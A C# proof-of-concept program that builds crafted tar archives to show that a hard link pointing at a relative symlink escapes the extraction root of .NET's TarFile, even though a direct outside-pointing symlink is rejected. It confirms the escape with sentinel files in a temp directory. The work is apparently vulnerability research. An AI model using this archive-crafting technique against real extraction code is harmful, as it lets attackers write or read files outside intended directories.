using System;
using System.Formats.Tar;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

class Program
{
    static void Require(bool cond, string msg)
    {
        if (!cond) throw new Exception("ASSERTION_FAILED: " + msg);
    }

    static string CreateControlTar(string root)
    {
        string tar = Path.Combine(root, "control.tar");
        using FileStream fs = File.Create(tar);
        using TarWriter writer = new TarWriter(fs, leaveOpen:false);
        writer.WriteEntry(new PaxTarEntry(TarEntryType.SymbolicLink, "escape")
        {
            LinkName = "../outside"
        });
        return tar;
    }

    static string CreateVariantTar(string root)
    {
        string tar = Path.Combine(root, "variant.tar");
        using FileStream fs = File.Create(tar);
        using TarWriter writer = new TarWriter(fs, leaveOpen:false);

        writer.WriteEntry(new PaxTarEntry(TarEntryType.Directory, "a/"));

        byte[] safeBytes = Encoding.UTF8.GetBytes("SAFE_INSIDE");
        writer.WriteEntry(new PaxTarEntry(TarEntryType.RegularFile, "inside")
        {
            DataStream = new MemoryStream(safeBytes, writable:false)
        });

        writer.WriteEntry(new PaxTarEntry(TarEntryType.SymbolicLink, "a/s")
        {
            LinkName = "../inside"
        });

        writer.WriteEntry(new PaxTarEntry(TarEntryType.HardLink, "escape")
        {
            LinkName = "a/s"
        });

        return tar;
    }

    static void Main()
    {
        Console.WriteLine($"FRAMEWORK={RuntimeInformation.FrameworkDescription}");
        Console.WriteLine($"OS={RuntimeInformation.OSDescription}");

        if (OperatingSystem.IsWindows())
        {
            Console.WriteLine("SKIP_WINDOWS_POSIX_HARDLINK_SYMLINK_SEMANTICS");
            return;
        }

        string root = Path.Combine(Path.GetTempPath(), "tar-hardlink-variant-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(root);

        try
        {
            string outside = Path.Combine(root, "inside");
            File.WriteAllText(outside, "OUTSIDE_SENTINEL_61af");

            string controlDest = Path.Combine(root, "control-dest");
            Directory.CreateDirectory(controlDest);
            string controlTar = CreateControlTar(root);

            bool controlRejected = false;
            try
            {
                TarFile.ExtractToDirectory(controlTar, controlDest, overwriteFiles:true);
            }
            catch(IOException)
            {
                controlRejected = true;
            }

            Console.WriteLine($"DIRECT_OUTSIDE_SYMLINK_REJECTED={controlRejected}");
            Require(controlRejected, "patched runtime must reject direct outside-pointing symlink");
            Require(!File.Exists(Path.Combine(controlDest, "escape")) &&
                    !Directory.Exists(Path.Combine(controlDest, "escape")),
                    "direct rejected escape link must not exist");

            string variantDest = Path.Combine(root, "variant-dest");
            Directory.CreateDirectory(variantDest);
            string variantTar = CreateVariantTar(root);

            TarFile.ExtractToDirectory(variantTar, variantDest, overwriteFiles:true);

            string sourceLink = Path.Combine(variantDest, "a", "s");
            string escapedLink = Path.Combine(variantDest, "escape");
            string safeInside = Path.Combine(variantDest, "inside");

            var sourceInfo = new FileInfo(sourceLink);
            var escapedInfo = new FileInfo(escapedLink);

            Console.WriteLine($"SOURCE_LINK_TARGET={sourceInfo.LinkTarget}");
            Console.WriteLine($"ESCAPE_LINK_TARGET={escapedInfo.LinkTarget}");
            Console.WriteLine($"SOURCE_READ={File.ReadAllText(sourceLink)}");
            Console.WriteLine($"ESCAPE_READ={File.ReadAllText(escapedLink)}");

            string sourceResolved = sourceInfo.ResolveLinkTarget(returnFinalTarget:true)?.FullName ?? "<null>";
            string escapeResolved = escapedInfo.ResolveLinkTarget(returnFinalTarget:true)?.FullName ?? "<null>";
            Console.WriteLine($"SOURCE_RESOLVED={sourceResolved}");
            Console.WriteLine($"ESCAPE_RESOLVED={escapeResolved}");
            Console.WriteLine($"DEST_ROOT={variantDest}");

            Require(File.ReadAllText(sourceLink) == "SAFE_INSIDE",
                "original deep symlink must remain safely contained");
            Require(File.ReadAllText(escapedLink) == "OUTSIDE_SENTINEL_61af",
                "hard-linked symlink at shallower path must resolve to outside sentinel");

            string destPrefix = Path.GetFullPath(variantDest) + Path.DirectorySeparatorChar;
            Require(!Path.GetFullPath(escapeResolved).StartsWith(destPrefix, StringComparison.Ordinal),
                "hard-linked symlink final target must be outside extraction root");

            Console.WriteLine("TAR_HARDLINK_REBASED_SYMLINK_ESCAPE=CONFIRMED");
        }
        finally
        {
            try { Directory.Delete(root, recursive:true); } catch {}
        }
    }
}
